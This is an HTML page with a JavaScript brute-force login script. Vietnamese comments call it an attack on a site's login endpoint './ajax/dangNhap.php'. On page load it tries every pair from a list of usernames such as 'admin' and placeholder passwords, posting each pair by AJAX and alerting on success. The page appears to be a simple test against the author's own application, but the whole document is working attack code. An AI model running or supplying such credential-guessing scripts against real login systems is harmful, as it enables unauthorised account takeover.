<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brute Force Test</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <script>
        async function bruteForce() {
            const url = './ajax/dangNhap.php'; // url có thể tấn công
            // giả sử đây sẽ là danh sách tài khoản mật khẩu thường dùng
            const usernames = [
                'admin',
                '20020001',
                'admin1',
                'admin2',
                'admin3',
                'admin4',
                'admin5',
                'admin6',
                'admin7',
            ];
            const passwords = [
                'password1',
                'password2',
                'password3',
                'password4',
                'password5',
                'password5',
                'password6',
                'password7',
                'password8',
                'password9',
                'password10',
                'password11',
                'password12',
                '12345678'
            ];
            for (let username of usernames) {
                for (let password of passwords) {
                    await $.ajax({
                        url: url,
                        type: "post",
                        data: {
                        action: "dangNhap",
                        tk: username,
                        mk: password,
                        },
                        success: function (response) {
                        data = JSON.parse(response);
                        console.log(response);
                        },
                    });
                    if (data.length > 0) {
                        alert(`Đăng nhập thành công tài khoản ${username} với mật khẩu: ${password}`);
                        // break;
                    } else {
                        console.log(`Đăng nhập thất bại tài khoản ${username} với mật khẩu: ${password}`);
                    }
                }
            }

        }

        // Bắt đầu tấn công brute force
        bruteForce();
    </script>
</body>
</html>
